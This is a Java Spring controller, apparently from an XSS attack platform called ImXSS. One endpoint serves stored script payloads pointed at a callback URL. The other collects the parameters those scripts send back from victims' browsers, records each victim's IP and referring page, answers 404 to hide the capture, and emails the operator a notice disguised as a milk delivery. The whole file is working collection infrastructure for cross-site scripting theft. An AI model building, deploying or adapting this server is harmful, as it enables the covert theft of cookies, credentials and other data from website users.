package com.imxss.web.controller.xss;

import java.text.MessageFormat;
import java.util.Date;
import java.util.List;
import java.util.Map;

import javax.annotation.Resource;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import org.coody.framework.context.annotation.LogHead;
import org.coody.framework.core.controller.BaseController;
import org.coody.framework.core.thread.XssThreadHandle;
import org.coody.framework.util.EncryptUtil;
import org.coody.framework.util.PrintException;
import org.coody.framework.util.RequestUtil;
import org.coody.framework.util.StringUtil;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.RequestMapping;

import com.imxss.web.domain.LetterInfo;
import com.imxss.web.domain.LetterParas;
import com.imxss.web.domain.ModuleInfo;
import com.imxss.web.domain.ProjectInfo;
import com.imxss.web.domain.ProjectModuleMapping;
import com.imxss.web.domain.UserInfo;
import com.imxss.web.service.EmailService;
import com.imxss.web.service.IpService;
import com.imxss.web.service.LetterService;
import com.imxss.web.service.ModuleService;
import com.imxss.web.service.ProjectService;
import com.imxss.web.service.SuffixService;
import com.imxss.web.service.UserService;

@Controller
@RequestMapping("/s")
public class XssController extends BaseController {

	@Resource
	ProjectService projectService;
	@Resource
	ModuleService moduleService;
	@Resource
	SuffixService suffixService;
	@Resource
	LetterService letterService;
	@Resource
	IpService ipService;
	@Resource
	UserService userService;
	@Resource
	EmailService emailService;

	@RequestMapping(value = { "/{id:\\d+}" })
	public void xssContext(HttpServletRequest req, HttpServletResponse res, @PathVariable Integer id) {
		ProjectInfo project = projectService.loadProjectInfo(id);
		if (StringUtil.isNullOrEmpty(project) || StringUtil.isNullOrEmpty(project.getModuleId())) {
			return;
		}
		// 匹配来源地址
		Integer moduleId = project.getModuleId();
		String referer = req.getHeader("Referer");
		List<ProjectModuleMapping> mappings = projectService.loadProjectMappings(id);
		if (!StringUtil.isNullOrEmpty(mappings)) {
			for (ProjectModuleMapping mapping : mappings) {
				logger.debug("来源地址:" + referer + ";匹配URL:" + mapping.getMappingUrl());
				if (StringUtil.isAntMatch(referer, mapping.getMappingUrl())) {
					moduleId = mapping.getModuleId();
					logger.debug("匹配模板:" + moduleId);
					continue;
				}

			}
		}
		setSessionPara("moduleId", moduleId);
		ModuleInfo module = moduleService.loadModuleInfo(moduleId);
		if (StringUtil.isNullOrEmpty(module)) {
			return;
		}
		String api = loadBasePath(req) + "s/" + "api_" + project.getId() + "."
				+ suffixService.loadSpringDefaultSuffix();
		String xmlCode = module.getContent().replace("{api}", api);
		try {
			res.getWriter().write(xmlCode);
		} catch (Exception e) {
		}
	}

	@RequestMapping(value = { "api_{id:\\d+}" })
	@LogHead("接受信封")
	public void api(HttpServletRequest req, HttpServletResponse res, @PathVariable Integer id) {
		try {
			Map<String, String> paraMap = getParas();
			if (StringUtil.isNullOrEmpty(paraMap)) {
				logger.error("未接受任何参数:" + id);
				return;
			}
			String referer = req.getHeader("Referer");
			String basePath = RequestUtil.loadBasePath(req);
			String ip = RequestUtil.getIpAddr(req);
			Integer moduleId = getSessionPara("moduleId");
			XssThreadHandle.xssThreadPool.execute(new Runnable() {
				@Override
				public void run() {
					doApi(id, referer, paraMap, basePath, ip, moduleId);
				}
			});
		} catch (Exception e) {
			PrintException.printException(logger, e);
		} finally {
			res.setStatus(404);
		}
	}

	private void doApi(Integer id, String referer, Map<String, String> paraMap, String basePath, String ip,
			Integer moduleId) {

		try {
			ProjectInfo project = projectService.loadProjectInfo(id);
			if (project == null) {
				logger.error("项目不存在:" + id);
				return;
			}
			// 过滤来源地址
			if (!StringUtil.isNullOrEmpty(project.getIgnoreRef())) {
				String[] pattens = project.getIgnoreRef().split(" ");
				for (String patten : pattens) {
					if (!StringUtil.isAntMatch(referer, patten)) {
						continue;
					}
					logger.error("来源地址已过滤:" + referer + ";" + patten);
					return;
				}
			}
			// 检查信封重复
			String unionId = EncryptUtil.md5Code(paraMap.toString());
			LetterInfo letter = letterService.loadLetterInfo(unionId);
			if (letter != null) {
				logger.error("信封已存在:" + referer + ";" + id + ";" + unionId);
				return;
			}
			letter = new LetterInfo();
			letter.setProjectId(id);
			letter.setRefUrl(referer);
			letter.setUpdateTime(new Date());
			letter.setIp(ip);
			letter.setIsReaded(0);
			letter.setRefUrl(referer);
			letter.setUnionId(unionId);
			letter.setUserId(project.getUserId());
			letter.setModuleId(moduleId);
			Integer letterId = letterService.writeLetterInfo(letter).intValue();
			if (letterId < 1) {
				logger.error("信封写入失败:" + letter);
				return;
			}
			for (String key : paraMap.keySet()) {
				try {
					LetterParas para = new LetterParas();
					para.setParaName(key);
					para.setParaValue(paraMap.get(key));
					para.setUpdateTime(new Date());
					para.setLetterId(letterId);
					letterService.writeLetterParas(para);
				} catch (Exception e) {
					// TODO: handle exception
				}
			}
			// 初始化IP地址信息
			ipService.loadIpInfo(ip);
			// 发送邮件
			if (project.getOpenEmail() == null || project.getOpenEmail() != 1) {
				return;
			}
			UserInfo userInfo = userService.loadUserInfo(project.getUserId());
			if (userInfo == null) {
				return;
			}
			String context = MessageFormat.format("商品来源:{0}\r\n商家身份:{1}\r\n\r\n您购买的牛奶已经到货,请登录http:{2} 查看", referer, ip,
					basePath);
			emailService.sendEmailAuto("ImXSS", context, userInfo.getEmail());
			return;
		} catch (Exception e) {
			PrintException.printException(logger, e);
		}
	}
}
